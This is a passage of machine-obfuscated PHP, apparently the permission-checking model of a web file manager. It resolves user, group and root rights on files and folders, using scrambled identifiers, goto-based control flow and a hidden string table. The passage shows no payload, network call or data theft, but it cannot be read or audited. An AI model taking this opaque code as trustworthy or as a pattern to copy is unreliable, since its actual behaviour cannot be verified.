$eÀ˜»ìÃóô->sourceInfo($Cº∏»»˜⁄é[0]); } if (!$cû«◊ΩöÇ÷) { $aëÈÉñÀÔ = array($eèâÛßµ¥‹[410] => array($eèâÛßµ¥‹[411], $Cº∏»»˜⁄é)); $cû«◊ΩöÇ÷ = $eÀ˜»ìÃóô->field($eèâÛßµ¥‹[1867])->where($aëÈÉñÀÔ)->select(); $cû«◊ΩöÇ÷ = array_to_keyvalue($cû«◊ΩöÇ÷, $eèâÛßµ¥‹[395]); } $e√∑≥–çÆÿ = $Cº∏»»˜⁄é; goto A®çÆÇ∑ıë; a∞ßÊôöˆﬂ: $eèâÛßµ¥‹ =& $_SERVER[ú∫]; if (!$Cº∏»»˜⁄é) { return array(); } $eÀ˜»ìÃóô = Model($eèâÛßµ¥‹[1206]); goto eÑãÜ∫ë∆á; e™ùÉ´¬¡≈: $c∑ûΩ≈≥∞ﬁ = $this->userIsRoot($Eõ—ùõ˘«Ñ); $BÒÎçπ•ªÈ = AuthModel::authAll(); $D‘ÒÊ™õ©¿ = array($eèâÛßµ¥‹[407] => $BÒÎçπ•ªÈ, $eèâÛßµ¥‹[1868] => array($eèâÛßµ¥‹[412] => 0, $eèâÛßµ¥‹[1698] => $BÒÎçπ•ªÈ, $eèâÛßµ¥‹[413] => LNG($eèâÛßµ¥‹[1869]), $eèâÛßµ¥‹[1713] => $eèâÛßµ¥‹[1870])); goto c‹¡â‹≤∫¥; E‡©ç≥ÁëÁ: $aì«Ááÿ¯‡ = $this->sourceAuthSelect($e√∑≥–çÆÿ); $eü™ñûÍ∑Ω = array(); foreach ($e√∑≥–çÆÿ as $bŒá‚ö €Õ) { if (isset($aì«Ááÿ¯‡[$bŒá‚ö €Õ])) { $eü™ñûÍ∑Ω[$bŒá‚ö €Õ] = $aì«Ááÿ¯‡[$bŒá‚ö €Õ]; } } goto e™ùÉ´¬¡≈; Aåá∑ó¿Üé: } public function authDeepCheck($b£≥∆ƒ»‘∆, $EÜµû•Âäœ = false) { goto D—©Û§Ëåé; B„Ûùñèêè: if (!in_array($b£≥∆ƒ»‘∆, $AÇµ ß†ÔΩ[$c∂ÒÌ§‰˜≤[1871]])) { return !1; } $dÙÆÿûÒµå = array(); foreach ($AÇµ ß†ÔΩ[$c∂ÒÌ§‰˜≤[1872]] as $b‡∏·Ôçêß => $B¶æıÍÎÍÕ) { if (!in_array($b£≥∆ƒ»‘∆, $B¶æıÍÎÍÕ)) { continue; } $dÙÆÿûÒµå[] = $b‡∏·Ôçêß; } goto b‚‹¬Éé†…; D—©Û§Ëåé: $c∂ÒÌ§‰˜≤ =& $_SERVER[ú∫]; $EÜµû•Âäœ = $EÜµû•Âäœ ? $EÜµû•Âäœ : USER_ID; $AÇµ ß†ÔΩ = $this->makeAuthDeep($EÜµû•Âäœ); goto B„Ûùñèêè; b‚‹¬Éé†…: if (!$dÙÆÿûÒµå) { return !1; } $f¯ƒ÷ùôâö = $dÙÆÿûÒµå ? $dÙÆÿûÒµå[0] : $b£≥∆ƒ»‘∆; return array($c∂ÒÌ§‰˜≤[407] => -1, $c∂ÒÌ§‰˜≤[446] => array($c∂ÒÌ§‰˜≤[412] => $c∂ÒÌ§‰˜≤[1085], $c∂ÒÌ§‰˜≤[1698] => $c∂ÒÌ§‰˜≤[191], $c∂ÒÌ§‰˜≤[413] => LNG($c∂ÒÌ§‰˜≤[1873]), $c∂ÒÌ§‰˜≤[1713] => $c∂ÒÌ§‰˜≤[1874]), $c∂ÒÌ§‰˜≤[1875] => LNG($c∂ÒÌ§‰˜≤[1876]), $c∂ÒÌ§‰˜≤[1877] => $this->sourceAuthInfo($f¯ƒ÷ùôâö)); goto eŸ‘“°Ù°¿; eŸ‘“°Ù°¿: } protected function makeAuthDeep($a∏Ö€ñ€’Ì = false) { goto aÊ€πõËüÌ; BËƒÓ∆õö¶: foreach ($aÈ„áˆè∑– as $AëäÏ»≥≤ø) { if ($AëäÏ»≥≤ø[$D¿•‚Çˆû÷[406]] == 0 && $AëäÏ»≥≤ø[$D¿•‚Çˆû÷[1714]] == $D¿•‚Çˆû÷[87]) { $f“ÕëËÎﬂµ[] = $AëäÏ»≥≤ø[$D¿•‚Çˆû÷[393]]; } } $cÖπÕéÈáç = $this->userGroupParents($a∏Ö€ñ€’Ì); $CçÆØ≈ÖÑ§ = array($D¿•‚Çˆû÷[404] => SourceModel::TYPE_USER, $D¿•‚Çˆû÷[484] => $a∏Ö€ñ€’Ì); goto e´¢‰âõä”; C‰éΩÀÇ€é: $dêÜ◊”Çª‡ = array_to_keyvalue_group($FÑêª∞îî⁄, $D¿•‚Çˆû÷[395]); foreach ($dêÜ◊”Çª‡ as $AÙ™Ì›–É≥ => $d∆ñ„›Ë˜) { $bÍ‚«ˆ¿æƒ = $this->authArrayCheck($d∆ñ„›Ë˜, $a∏Ö€ñ€’Ì); if ($bÍ‚«ˆ¿æƒ[$D¿•‚Çˆû÷[407]] > 0) { $Aê ”—äóã[] = $AÙ™Ì›–É≥ . $D¿•‚Çˆû÷[33]; } } $Fƒ∫´º¬ó = array(); goto fæÉ‚ﬁø≈; fæÉ‚ﬁø≈: $c™öüô˘ñ = $cÖπÕéÈáç; $F ©≠¥‰ÓÒ = Model($D¿•‚Çˆû÷[1206]); $bﬁÿ’ÏüØ≈ = Model($D¿•‚Çˆû÷[486]); goto fÚç“÷öÿ≈; CπâÛÚÚˆ”: $a‚™Áı™…– = array(); if ($Aê ”—äóã) { $e¡§ÙÒËˆ° = $F ©≠¥‰ÓÒ->where(array($D¿•‚Çˆû÷[395] => array($D¿•‚Çˆû÷[411], $Aê ”—äóã)))->select(); foreach ($e¡§ÙÒËˆ° as $aÏ∆°òºÉ») { $aÍúÇ≈◊∆ø = $F ©≠¥‰ÓÒ->parentLevelArray($aÏ∆°òºÉ»[$D¿•‚Çˆû÷[487]]); $Fƒ∫´º¬ó = array_merge($Fƒ∫´º¬ó, $aÍúÇ≈◊∆ø); $c™öüô˘ñ[] = $aÏ∆°òºÉ»[$D¿•‚Çˆû÷[484]]; $eı¶Ÿø⁄±—[$aÏ∆°òºÉ»[$D¿•‚Çˆû÷[395]]] = $aÍúÇ≈◊∆ø; $Fåƒéõòèú[$aÏ∆°òºÉ»[$D¿•‚Çˆû÷[395]]] = $aÏ∆°òºÉ»[$D¿•‚Çˆû÷[484]]; } } $c™öüô˘ñ = array_values(array_unique($c™öüô˘ñ)); goto e´îÜªÖÎ‘; e´îÜªÖÎ‘: $B¨ó§§†… = $c™öüô˘ñ; foreach ($B¨ó§§†… as $AôÇ ‚„ñ») { $B‡ÀÂÜªï≤ = $bﬁÿ’ÏüØ≈->getInfo($AôÇ ‚„ñ»); $aÍúÇ≈◊∆ø = $F ©≠¥‰ÓÒ->parentLevelArray($B‡ÀÂÜªï≤[$D¿•‚Çˆû÷[487]]); $c™öüô˘ñ = array_merge($c™öüô˘ñ, $aÍúÇ≈◊∆ø); } $c™öüô˘ñ = array_values(array_unique($c™öüô˘ñ)); goto cî´Ç⁄ê¥; FêœÖÀ·‚Ω: if (isset($d‚∂ ê∞¶†[$a∏Ö€ñ€’Ì])) { return $d‚∂ ê∞¶†[$a∏Ö€ñ€’Ì]; } $aÈ„áˆè∑– = Model($D¿•‚Çˆû÷[1878])->listData(); $f“ÕëËÎﬂµ = array(); goto BËƒÓ∆õö¶; b†›âÃ∂»È: $B⁄πÑ±‰ƒ— = array($D¿•‚Çˆû÷[1871] => $Fƒ∫´º¬ó, $D¿•‚Çˆû÷[1872] => $eı¶Ÿø⁄±—); $d‚∂ ê∞¶†[$a∏Ö€ñ€’Ì] = $B⁄πÑ±‰ƒ—; return $B⁄πÑ±‰ƒ—; goto Dﬁ¥¨ÙÍÙì; fÚç“÷öÿ≈: $eı¶Ÿø⁄±— = array(); $Fåƒéõòèú = array(); $b…¿Ÿ∫Õú“ = array(); goto CπâÛÚÚˆ”; e´¢‰âõä”: if ($cÖπÕéÈáç) { $CçÆØ≈ÖÑ§ = array(array($D¿•‚Çˆû÷[404] => SourceModel::TYPE_USER, $D¿•‚Çˆû÷[484] => $a∏Ö€ñ€’Ì), array($D¿•‚Çˆû÷[404] => SourceModel::TYPE_GROUP, $D¿•‚Çˆû÷[484] => array($D¿•‚Çˆû÷[411], $cÖπÕéÈáç)), $D¿•‚Çˆû÷[957] => $D¿•‚Çˆû÷[1779]); } $FÑêª∞îî⁄ = $this->field($D¿•‚Çˆû÷[1879])->where($CçÆØ≈ÖÑ§)->select(); $Aê ”—äóã = array(); goto C‰éΩÀÇ€é; aÊ€πõËüÌ: $D¿•‚Çˆû÷ =& $_SERVER[ú∫]; static $d‚∂ ê∞¶† = array(); $a∏Ö€ñ€’Ì = $a∏Ö€ñ€’Ì ? $a∏Ö€ñ€’Ì : USER_ID; goto FêœÖÀ·‚Ω; cî´Ç⁄ê¥: foreach ($c™öüô˘ñ as $AôÇ ‚„ñ») { $B‡ÀÂÜªï≤ = $bﬁÿ’ÏüØ≈->getInfo($AôÇ ‚„ñ»); $Fƒ∫´º¬ó[] = $B‡ÀÂÜªï≤[$D¿•‚Çˆû÷[85]][$D¿•‚Çˆû÷[395]]; $b…¿Ÿ∫Õú“[$AôÇ ‚„ñ»] = $B‡ÀÂÜªï≤[$D¿•‚Çˆû÷[85]][$D¿•‚Çˆû÷[395]]; $a‚™Áı™…–[$AôÇ ‚„ñ»] = $F ©≠¥‰ÓÒ->parentLevelArray($B‡ÀÂÜªï≤[$D¿•‚Çˆû÷[487]]); } foreach ($eı¶Ÿø⁄±— as $AãÃêΩŒ≠— => $f ‡öÿë«π) { $F¡¥—Ø»≥∂ = $Fåƒéõòèú[$AãÃêΩŒ≠—]; if (!$F¡¥—Ø»≥∂ || !$b…¿Ÿ∫Õú“[$F¡¥—Ø»≥∂]) { continue; } $BöÕìé“‡ = array(); foreach ($a‚™Áı™…–[$F¡¥—Ø»≥∂] as $AôÇ ‚„ñ») { $BöÕìé“‡[] = $b…¿Ÿ∫Õú“[$AôÇ ‚„ñ»]; } $eı¶Ÿø⁄±—[$AãÃêΩŒ≠—] = array_merge($BöÕìé“‡, $f ‡öÿë«π); } $Fƒ∫´º¬ó = array_values(array_unique($Fƒ∫´º¬ó)); goto b†›âÃ∂»È; Dﬁ¥¨ÙÍÙì: } private function makeSourceAuth($D“∑Öµ∂œ, $B›©üÓºœÌ, $AÀ‹·à÷˘î = false) { goto eìº¶ßÎÏ·; E©—¿òîÕé: $eæöãﬁ§®Ú = $D“∑Öµ∂œ[$dõ”ä¶ÛÀÁ[404]] == SourceModel::TYPE_GROUP; $E‡¨ÜÊÔñ∂ = $eæöãﬁ§®Ú ? $this->groupRootAuth($côØìöåè…, $AÀ‹·à÷˘î) : !1; if ($E‡¨ÜÊÔñ∂ && Model($dõ”ä¶ÛÀÁ[1859])->authCheckAction($E‡¨ÜÊÔñ∂[$dõ”ä¶ÛÀÁ[406]], $dõ”ä¶ÛÀÁ[1712])) { return $this->groupAuthInfo($E‡¨ÜÊÔñ∂, $côØìöåè…); } goto b”πã≤ﬁ©©; eìº¶ßÎÏ·: $dõ”ä¶ÛÀÁ =& $_SERVER[ú∫]; $DΩ»µ◊ñã  = $dõ”ä¶ÛÀÁ[87]; $côØìöåè… = $D“∑Öµ∂œ[$dõ”ä¶ÛÀÁ[484]]; goto E©—¿òîÕé; e√í¨áŸâå: if (!$DËº√‘∏ê“) { $AË“™Ôùß¢ = Model($dõ”ä¶ÛÀÁ[486])->getInfo($côØìöåè…); $c”ò∂è‰Õå = explode($dõ”ä¶ÛÀÁ[47], trim($AË“™Ôùß¢[$dõ”ä¶ÛÀÁ[487]], $dõ”ä¶ÛÀÁ[47])); $c”ò∂è‰Õå = array_reverse($c”ò∂è‰Õå); foreach ($c”ò∂è‰Õå as $aï¿ù∫Ÿœ¿) { if ($aï¿ù∫Ÿœ¿ == $dõ”ä¶ÛÀÁ[191] || $aï¿ù∫Ÿœ¿ == $DΩ»µ◊ñã ) { continue; } $FÌ÷¨ùóí  = $this->groupRootAuth($aï¿ù∫Ÿœ¿, $AÀ‹·à÷˘î); if (!$FÌ÷¨ùóí ) { continue; } $DËº√‘∏ê“ = $this->groupAuthInfo($FÌ÷¨ùóí , $aï¿ù∫Ÿœ¿); break; } } if (!$DËº√‘∏ê“ || $DËº√‘∏ê“[$dõ”ä¶ÛÀÁ[407]] <= 0) { $Cﬂ±™…πÍÛ = $this->authDeepCheck($D“∑Öµ∂œ[$dõ”ä¶ÛÀÁ[395]], $AÀ‹·à÷˘î); if ($Cﬂ±™…πÍÛ) { $DËº√‘∏ê“ = $Cﬂ±™…πÍÛ; } } return $DËº√‘∏ê“; goto BÑâ‘º◊«–; DãÕé÷¶éè: foreach ($AÖ•¶ÆÜã‡ as $DÔÌå¯ÙÇ´) { if (!isset($B›©üÓºœÌ[$DÔÌå¯ÙÇ´])) { continue; } $F≥òëÿ°∂ƒ = $this->authMake($B›©üÓºœÌ[$DÔÌå¯ÙÇ´], $AÀ‹·à÷˘î); if ($F≥òëÿ°∂ƒ[$dõ”ä¶ÛÀÁ[446]]) { $DËº√‘∏ê“ = $F≥òëÿ°∂ƒ; break; } } if (!$eæöãﬁ§®Ú) { return $DËº√‘∏ê“; } if (!$DËº√‘∏ê“ && $E‡¨ÜÊÔñ∂) { $DËº√‘∏ê“ = $this->groupAuthInfo($E‡¨ÜÊÔñ∂, $côØìöåè…); } goto e√í¨áŸâå; b”πã≤ﬁ©©: $AÖ•¶ÆÜã‡ = Model($dõ”ä¶ÛÀÁ[1206])->parentLevelArray($D“∑Öµ∂œ[$dõ”ä¶ÛÀÁ[487]]); $AÖ•¶ÆÜã‡ = array_merge(array($D“∑Öµ∂œ[$dõ”ä¶ÛÀÁ[395]]), array_reverse($AÖ•¶ÆÜã‡)); $DËº√‘∏ê“ = !1; goto DãÕé÷¶éè; BÑâ‘º◊«–: } private function userIsRoot($F≤î∂‚¥áƒ = false) { $F•–∞Ê„˜Í =& $_SERVER[ú∫]; if (!$F≤î∂‚¥áƒ && _get($GLOBALS, $F•–∞Ê„˜Í[485])) { return !0; } $bç…ÛÂ∑ÍÖ = Model($F•–∞Ê„˜Í[506])->getInfo($F≤î∂‚¥áƒ); $fÁÃ»Ï÷¥ = Model($F•–∞Ê„˜Í[1880])->listData($bç…ÛÂ∑ÍÖ[$F•–∞Ê„˜Í[1411]]); if ($fÁÃ»Ï÷¥ && $fÁÃ»Ï÷¥[$F•–∞Ê„˜Í[1283]][$F•–∞Ê„˜Í[1881]] == 1) { return !0; } return !1; } private function sourceAuthInfo($D›ÓÒ∞∂áÆ) { goto F‹¶¬ ⁄é∞; dÇ°£®º—–: if (!$DÃÑõ‹¯„Ô) { return !1; } $Eá‰òëâ◊“->groupPathDisplay($DÃÑõ‹¯„Ô); $DñûÿŸŒ¨≥ = array($DÃÑõ‹¯„Ô); goto dÂïŒ§È∫∑; Aæ“ßºå”â: if (isset($DÃÑõ‹¯„Ô[$CÎÍß‚Îç≥[492]])) { $BÔâ≥≠¶Ü› = explode($CÎÍß‚Îç≥[8], trim($DÃÑõ‹¯„Ô[$CÎÍß‚Îç≥[495]], $CÎÍß‚Îç≥[8])); array_shift($BÔâ≥≠¶Ü›); $cö¢Â≈öìÕ = $DÃÑõ‹¯„Ô[$CÎÍß‚Îç≥[490]] . $CÎÍß‚Îç≥[1882] . implode($CÎÍß‚Îç≥[8], $BÔâ≥≠¶Ü›); } return array($CÎÍß‚Îç≥[413] => $DÃÑõ‹¯„Ô[$CÎÍß‚Îç≥[28]], $CÎÍß‚Îç≥[76] => KodIO::make($DÃÑõ‹¯„Ô[$CÎÍß‚Îç≥[395]]), $CÎÍß‚Îç≥[1883] => $cö¢Â≈öìÕ); goto cÿÎó–“∂≠; F‹¶¬ ⁄é∞: $CÎÍß‚Îç≥ =& $_SERVER[ú∫]; $Eá‰òëâ◊“ = Model($CÎÍß‚Îç≥[1206]); $DÃÑõ‹¯„Ô = $Eá‰òëâ◊“->sourceInfo($D›ÓÒ∞∂áÆ); goto dÇ°£®º—–; dÂïŒ§È∫∑: $DñûÿŸŒ¨≥ = $Eá‰òëâ◊“->_listAppendPath($DñûÿŸŒ¨≥); $DÃÑõ‹¯„Ô = $DñûÿŸŒ¨≥[0]; $cö¢Â≈öìÕ = $DÃÑõ‹¯„Ô[$CÎÍß‚Îç≥[495]]; goto Aæ“ßºå”â; cÿÎó–“∂≠: } private function groupAuthInfo($büºÂèÃµÛ, $bºŒ≠¬‘µ°) { $c‚©àŒ∆√ß =& $_SERVER[ú∫]; $F˜œå–Ÿ’Ò = Model($c‚©àŒ∆√ß[486])->getInfo($bºŒ≠¬‘µ°); return array($c‚©àŒ∆√ß[1884] => intval($büºÂèÃµÛ[$c‚©àŒ∆√ß[406]]), $c‚©àŒ∆√ß[1868] => $büºÂèÃµÛ, $c‚©àŒ∆√ß[1885] => LNG($c‚©àŒ∆√ß[1886]), $c‚©àŒ∆√ß[1877] => array($c‚©àŒ∆√ß[413] => $F˜œå–Ÿ’Ò[$c‚©àŒ∆√ß[28]], $c‚©àŒ∆√ß[76] => KodIO::make($F˜œå–Ÿ’Ò[$c‚©àŒ∆√ß[85]][$c‚©àŒ∆√ß[395]]), $c‚©àŒ∆√ß[1883] => $F˜œå–Ÿ’Ò[$c‚©àŒ∆√ß[491]])); } protected function groupRootAuth($AáÎ£ÖÖì¡, $Aæôÿ∂ÁÙì = false) { goto Aåì´‘œ®ì; Aåì´‘œ®ì: $d≠óìπ›û≤ =& $_SERVER[ú∫]; $Aæôÿ∂ÁÙì = $Aæôÿ∂ÁÙì ? $Aæôÿ∂ÁÙì : USER_ID; $a©â¨àÑœÔ = $Aæôÿ∂ÁÙì . $d≠óìπ›û≤[1887] . $AáÎ£ÖÖì¡; goto aïΩÛè±äô; F¥â‰çô∂‡: $fÜ’Æ‹Ö° [$a©â¨àÑœÔ] = $C†®†„Êî¯ ? $C†®†„Êî¯ : $Fµã˘äã¨Ã; return $fÜ’Æ‹Ö° [$a©â¨àÑœÔ]; goto a…Ü•è±è; AºÿÚ∫ãÑã: $F∞ÚÀÜ∏™â = $this->userGroupList($Aæôÿ∂ÁÙì); $Fµã˘äã¨Ã = isset($F∞ÚÀÜ∏™â[$AáÎ£ÖÖì¡]) ? $F∞ÚÀÜ∏™â[$AáÎ£ÖÖì¡][$d≠óìπ›û≤[406]] : !1; if ($Fµã˘äã¨Ã && Model($d≠óìπ›û≤[1859])->authCheckAction($Fµã˘äã¨Ã[$d≠óìπ›û≤[406]], $d≠óìπ›û≤[1712])) { $fÜ’Æ‹Ö° [$a©â¨àÑœÔ] = $Fµã˘äã¨Ã; return $Fµã˘äã¨Ã; } goto dØÓ‹ëÛØ; aïΩÛè±äô: static $fÜ’Æ‹Ö°  = array(); if (isset($fÜ’Æ‹Ö° [$a©â¨àÑœÔ])) { return $fÜ’Æ‹Ö° [$a©â¨àÑœÔ]; } $bïêûó†’Ï = Model($d≠óìπ›û≤[486])->getInfo($AáÎ£ÖÖì¡); goto AºÿÚ∫ãÑã; dØÓ‹ëÛØ: $Aÿ¡‰ïÁÊá = $this->sourceAuthSelect($bïêûó†’Ï[$d≠óìπ›û≤[85]][$d≠óìπ›û≤[395]]); $FùÜãÿá•‘ = $Aÿ¡‰ïÁÊá ? $this->authMake($Aÿ¡‰ïÁÊá, $Aæôÿ∂ÁÙì) : !1; $C†®†„Êî¯ = $FùÜãÿá•‘ ? $FùÜãÿá•‘[$d≠óìπ›û≤[446]] : !1; goto F¥â‰çô∂‡; a…Ü•è±è: } public function authOwnerApply($aÖùÚÚ∂ßÑ) { goto d°æ∏¶ƒ¨œ; bÌåëÜÛÜ: $aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[406]][$B≥ΩÇá≥á[1890]] = Model($B≥ΩÇá≥á[502])->userListInfo($có¶ãˆ£áá); return $aÖùÚÚ∂ßÑ; goto FØ©é©–∆∏; FÛõ∞ÕíÇ™: $Eœ≥Óçµ Ñ = Model($B≥ΩÇá≥á[1206])->parentLevelArray($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[487]]); $Eœ≥Óçµ Ñ = array_merge(array($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[395]]), array_reverse($Eœ≥Óçµ Ñ)); $d•Íñ¿ÖØú = $this->sourceAuthSelect($Eœ≥Óçµ Ñ); goto AÌÆÙîØ÷Û; d°æ∏¶ƒ¨œ: $B≥ΩÇá≥á =& $_SERVER[ú∫]; if (empty($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[406]]) || isset($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[1888]]) && $aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[1888]]) { return $aÖùÚÚ∂ßÑ; } if (AuthModel::authCheckRoot($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[406]][$B≥ΩÇá≥á[407]])) { return $aÖùÚÚ∂ßÑ; } goto FÛõ∞ÕíÇ™; AÌÆÙîØ÷Û: $e¬µµ‘∂á∏ = array(); $có¶ãˆ£áá = array(); foreach ($d•Íñ¿ÖØú as $A˜œ‹´∫ÚØ => $f¨°∏’√”) { $eíÉüﬁ“ÏÓ = $this->authFolderOwnerUser($f¨°∏’√”); $e¬µµ‘∂á∏[$A˜œ‹´∫ÚØ] = $eíÉüﬁ“ÏÓ; $có¶ãˆ£áá = array_merge($có¶ãˆ£áá, $eíÉüﬁ“ÏÓ[$B≥ΩÇá≥á[562]]); if ($eíÉüﬁ“ÏÓ[$B≥ΩÇá≥á[1889]]) { break; } } goto cƒÓ›îâÖ∫; cƒÓ›îâÖ∫: if (count($có¶ãˆ£áá) == 0) { $có¶ãˆ£áá = $this->authFolderOwnerGroup($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[484]]); } $có¶ãˆ£áá = array_unique($có¶ãˆ£áá); if (AuthModel::authCheckRoot($aÖùÚÚ∂ßÑ[$B≥ΩÇá≥á[406]][$B≥ΩÇá≥á[407]])) { $có¶ãˆ£áá[] = USER_ID; } goto bÌåëÜÛÜ; FØ©é©–∆∏: } private function authFolderOwnerGroup($dŒ∫ªüê’˜) { $eœàúÏ…æÀ =& $_SERVER[ú∫]; $D»‘å∞Ûâ™ = Model($eœàúÏ…æÀ[1773])->where(array($eœàúÏ…æÀ[1692] => $dŒ∫ªüê’˜))->select(); $cà≤≤‘«¯• = array(); if (!$D»‘å∞Ûâ™) { return $cà≤≤‘«¯•; } foreach ($D»‘å∞Ûâ™ as $câ”©Õ∫Ì®) { $cüèÿé“‘è = $this->authInfo($câ”©Õ∫Ì®); if (AuthModel::authCheckRoot($cüèÿé“‘è[$eœàúÏ…æÀ[406]])) { $cà≤≤‘«¯•[] = $câ”©Õ∫Ì®[$eœàúÏ…æÀ[1528]]; } } return $cà≤≤‘«¯•; } private function authFolderOwnerUser($e¶ºóãú‘à) { $CÒë›∫‹Ω… =& $_SERVER[ú∫]; $cÊ®òÌ€∫ = array(); $d˘∞ÓùÛ·£ = !1; foreach ($e¶ºóãú‘à as $aõ´êº§êÕ) { $FÌèúäçáÜ = $this->authInfo($aõ´êº§êÕ); if ($aõ´êº§êÕ[$CÒë›∫‹Ω…[484]] == $CÒë›∫‹Ω…[191]) { $d˘∞ÓùÛ·£ = !0; } if ($aõ´êº§êÕ[$CÒë›∫‹Ω…[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($FÌèúäçáÜ[$CÒë›∫‹Ω…[406]])) { $cÊ®òÌ€∫[] = $aõ´êº§êÕ[$CÒë›∫‹Ω…[484]]; } } } return array($CÒë›∫‹Ω…[562] => $cÊ®òÌ€∫, $CÒë›∫‹Ω…[1889] => $d˘∞ÓùÛ·£); } public function authMake($Aã’∏ÒıΩı, $D€“ΩÏöè£ = false) { $bçËÆ˘ç”≠ =& $_SERVER[ú∫]; $bµ∑û‰ﬁ‚Û = $this->authArrayCheck($Aã’∏ÒıΩı, $D€“ΩÏöè£); if ($bµ∑û‰ﬁ‚Û[$bçËÆ˘ç”≠[1891]]) { $bµ∑û‰ﬁ‚Û[$bçËÆ˘ç”≠[1891]] = $this->sourceAuthInfo($bµ∑û‰ﬁ‚Û[$bçËÆ˘ç”≠[1891]]); } return $bµ∑û‰ﬁ‚Û; } public function authArrayCheck($C—πßéπñÖ, $d·ü¡Ë˘Ì = false) { goto F•€∫å”±À; Cñ√ë¨¿åç: foreach ($C—πßéπñÖ as $bëË—ß∆ŸÓ) { $Dà¥†õ∫ãË = $this->authInfo($bëË—ß∆ŸÓ); if (!$Dà¥†õ∫ãË) { continue; } $F¿ÖÖ≈ÙáŸ = $bëË—ß∆ŸÓ[$aáÇ¬Çè—¥[484]]; $AÔöÚÌËÇ≠ = intval($Dà¥†õ∫ãË[$aáÇ¬Çè—¥[406]]); if ($bëË—ß∆ŸÓ[$aáÇ¬Çè—¥[404]] == SourceModel::TYPE_USER && $F¿ÖÖ≈ÙáŸ == $d·ü¡Ë˘Ì) { $EÑ‰Â‚ûˆ≠ = !0; $c÷œ¢ûàíô = $Dà¥†õ∫ãË; $Eë˘˘«è∞ô = $AÔöÚÌËÇ≠; } else { if ($bëË—ß∆ŸÓ[$aáÇ¬Çè—¥[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($F¿ÖÖ≈ÙáŸ, $d·ü¡Ë˘Ì)) { $c•≤∆Õõﬂì = !0; $FÑ’ŸèπñÔ = $this->groupStepToUserGroup($F¿ÖÖ≈ÙáŸ, $d·ü¡Ë˘Ì); if ($FÑ’ŸèπñÔ < $aÇ∏êÓ¿¯õ) { $aÇ∏êÓ¿¯õ = $FÑ’ŸèπñÔ; $EÕ◊£ÍìÑƒ = $AÔöÚÌËÇ≠; $BîÃø∆πô¿ = $Dà¥†õ∫ãË; $Câãú‡÷„∑ = $F¿ÖÖ≈ÙáŸ; } if ($FÑ’ŸèπñÔ == $aÇ∏êÓ¿¯õ && $AÔöÚÌËÇ≠ >= $EÕ◊£ÍìÑƒ) { $EÕ◊£ÍìÑƒ = $AÔöÚÌËÇ≠; $BîÃø∆πô¿ = $Dà¥†õ∫ãË; $Câãú‡÷„∑ = $F¿ÖÖ≈ÙáŸ; } } else { if ($F¿ÖÖ≈ÙáŸ == $aáÇ¬Çè—¥[191]) { $a≠À§á…∆Á = !0; $aŸ€Îç»äÍ = $Dà¥†õ∫ãË; $bƒ°èèø÷Ù = $AÔöÚÌËÇ≠; } } } } if ($EÑ‰Â‚ûˆ≠) { $fü∂äé¿“¬ = $Eë˘˘«è∞ô; $Dà¥†õ∫ãË = $c÷œ¢ûàíô; $C£Üà–‡éù = LNG($aáÇ¬Çè—¥[1892]); } else { if ($c•≤∆Õõﬂì) { $fü∂äé¿“¬ = $EÕ◊£ÍìÑƒ; $Dà¥†õ∫ãË = $BîÃø∆πô¿; $cÍ≤”à¬Ñ® = Model($aáÇ¬Çè—¥[486])->getInfo($Câãú‡÷„∑); $C£Üà–‡éù = $aáÇ¬Çè—¥[160] . $cÍ≤”à¬Ñ®[$aáÇ¬Çè—¥[491]] . $aáÇ¬Çè—¥[1893] . LNG($aáÇ¬Çè—¥[1894]); } else { if ($a≠À§á…∆Á) { $fü∂äé¿“¬ = $bƒ°èèø÷Ù; $Dà¥†õ∫ãË = $aŸ€Îç»äÍ; $C£Üà–‡éù = LNG($aáÇ¬Çè—¥[1865]); } else { $fü∂äé¿“¬ = 0; $Dà¥†õ∫ãË = !1; $C£Üà–‡éù = $aáÇ¬Çè—¥[33]; } } } $BÃı´°Ùƒ” = array($aáÇ¬Çè—¥[1884] => intval($fü∂äé¿“¬), $aáÇ¬Çè—¥[1868] => $Dà¥†õ∫ãË, $aáÇ¬Çè—¥[1885] => $C£Üà–‡éù, $aáÇ¬Çè—¥[1877] => $bëË—ß∆ŸÓ[$aáÇ¬Çè—¥[395]]); goto A¯•∆Ûê‘; aœ¨¯≤≈€∆: $bƒ°èèø÷Ù = 0; $aŸ€Îç»äÍ = 0; $bëË—ß∆ŸÓ = array($aáÇ¬Çè—¥[395] => 0); goto Cñ√ë¨¿åç; dáÀ÷…∂êø: $c•≤∆Õõﬂì = 0; $EÕ◊£ÍìÑƒ = 0; $BîÃø∆πô¿ = 0; goto eï∞û≥°ÁÏ; eï∞û≥°ÁÏ: $aÇ∏êÓ¿¯õ = 1000; $Câãú‡÷„∑ = 0; $a≠À§á…∆Á = 0; goto aœ¨¯≤≈€∆; F•€∫å”±À: $aáÇ¬Çè—¥ =& $_SERVER[ú∫]; if (!$C—πßéπñÖ) { return array($aáÇ¬Çè—¥[407] => 0, $aáÇ¬Çè—¥[446] => !1); } $d·ü¡Ë˘Ì = $d·ü¡Ë˘Ì ? $d·ü¡Ë˘Ì : USER_ID; goto eÿ¥éÊÜ¢Ã; eÿ¥éÊÜ¢Ã: $EÑ‰Â‚ûˆ≠ = 0; $Eë˘˘«è∞ô = 0; $c÷œ¢ûàíô = 0; goto dáÀ÷…∂êø; A¯•∆Ûê‘: return $BÃı´°Ùƒ”; goto aäà—Ö‘ò˘; aäà—Ö‘ò˘: } private function groupContainUser($EÑÖÛäÓ—Í, $fø»ª˜„∂∞ = false) { return in_array($EÑÖÛäÓ—Í, $this->userGroupParents($fø»ª˜„∂∞)); } private function groupStepToUserGroup($e«Ë∑ÓÒıÜ, $AËˆô˜†ﬁã = false) { goto E√ú“äÈ≤Ë; Bë∂Ëô¯µ±: return $EâÔÀúê–é; goto BêöÏÆˆèé; E√ú“äÈ≤Ë: $e‘Ç◊¿≥èé =& $_SERVER[ú∫]; $a‚∏µÑ˜í€ = $this->userGroupList($AËˆô˜†ﬁã); $EâÔÀúê–é = 1000; goto e˘≥‹∫⁄Öô; e˘≥‹∫⁄Öô: $AÀâò®Òêœ = 